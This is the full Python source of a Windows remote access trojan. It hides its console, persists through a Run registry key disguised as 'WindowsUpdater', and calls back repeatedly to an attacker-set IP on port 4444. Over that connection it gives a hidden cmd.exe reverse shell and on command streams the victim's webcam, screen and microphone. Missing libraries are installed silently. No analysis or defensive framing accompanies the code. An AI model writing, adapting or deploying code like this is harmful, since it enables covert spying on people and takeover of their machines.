import sys
import os
import subprocess
import time
import socket
import ctypes
import winreg
import threading
import importlib.util
import base64

HOST = 'IP_HERE'  
PORT = 4444

def is_running_with_pythonw():
    return os.path.basename(sys.executable).lower() == "pythonw.exe"

def relaunch_with_pythonw():
    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    script = os.path.realpath(sys.argv[0])
    subprocess.Popen([pythonw, script])
    sys.exit(0)

def add_to_startup():
    try:
        script_path = os.path.realpath(sys.argv[0])
        pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_name = "WindowsUpdater"
        command = f'"{pythonw}" "{script_path}"'
        registry = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(registry, reg_name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(registry)
    except Exception:
        pass

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def install_if_missing(module_name):
    if importlib.util.find_spec(module_name) is None:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

def stream_camera(s):
    try:
        install_if_missing("opencv-python")
        import cv2

        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            s.send(b"[!] Cannot access webcam.\n")
            return

        s.send(b"[+] Camera streaming started. Type 'stopcam' to end.\n")

        while True:
            ret, frame = cam.read()
            if not ret:
                break

            frame = cv2.resize(frame, (640, 480), interpolation=cv2.INTER_AREA)

            _, buffer = cv2.imencode('.jpg', frame)
            data = base64.b64encode(buffer)
            s.sendall(b"FRAME_START\n")
            s.sendall(data + b"\nFRAME_END\n")

            s.settimeout(0.1)
            try:
                stop_cmd = s.recv(1024).decode().strip().lower()
                if stop_cmd == "stopcam":
                    break
            except socket.timeout:
                pass

            time.sleep(0.1)

    except Exception as e:
        s.send(f"[!] Camera error: {str(e)}\n".encode())
    finally:
        try:
            cam.release()
        except:
            pass
        s.settimeout(None)

def stream_screen(s):
    try:
        install_if_missing("opencv-python")
        install_if_missing("Pillow")
        import cv2
        from PIL import ImageGrab
        import numpy as np

        s.send(b"[+] Screen streaming started. Type 'stopcam' to end.\n")

        while True:
            img = ImageGrab.grab()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            frame = cv2.resize(frame, (640, 480), interpolation=cv2.INTER_AREA)

            _, buffer = cv2.imencode('.jpg', frame)
            data = base64.b64encode(buffer)
            s.sendall(b"FRAME_START\n")
            s.sendall(data + b"\nFRAME_END\n")

            s.settimeout(0.1)
            try:
                stop_cmd = s.recv(1024).decode().strip().lower()
                if stop_cmd == "stopcam":
                    break
            except socket.timeout:
                pass

            time.sleep(0.1)

    except Exception as e:
        s.send(f"[!] Screen error: {str(e)}\n".encode())
    finally:
        s.settimeout(None)

def stream_mic(s):
    try:
        install_if_missing("sounddevice")
        import sounddevice as sd
        import numpy as np

        samplerate = 44100
        duration = 0.5  # seconds
        channels = 1

        s.send(b"[+] Mic streaming started. Type 'stopmic' to stop.\n")

        while True:
            audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=channels, dtype='int16')
            sd.wait()
            s.sendall(b"MIC_START\n")
            s.sendall(audio.tobytes() + b"\nMIC_END\n")

            s.settimeout(0.01)
            try:
                stop_cmd = s.recv(1024).decode().strip().lower()
                if stop_cmd == "stopmic":
                    break
            except socket.timeout:
                pass

    except Exception as e:
        s.send(f"[!] Mic error: {str(e)}\n".encode())
    finally:
        s.settimeout(None)

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            shell(s)
        except:
            try:
                s.close()
            except:
                pass
            time.sleep(5)

def shell(s):
    proc = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    def read_from_shell():
        try:
            for line in proc.stdout:
                if not line:
                    break
                s.send(line.encode())
        except Exception:
            pass

    thread = threading.Thread(target=read_from_shell, daemon=True)
    thread.start()

    try:
        while True:
            command = s.recv(1024).decode("utf-8").strip()
            if command.lower() == "exit":
                break
            elif command.lower() == "livecam":
                stream_camera(s)
                continue
            elif command.lower() == "livescreen":
                stream_screen(s)
                continue
            elif command.lower() == "livemic":
                stream_mic(s)
                continue
            proc.stdin.write(command + "\n")
            proc.stdin.flush()
    except Exception:
        pass

    proc.kill()
    s.close()

if __name__ == "__main__":
    if not is_running_with_pythonw():
        relaunch_with_pythonw()

    hide_console()
    add_to_startup()
    connect()
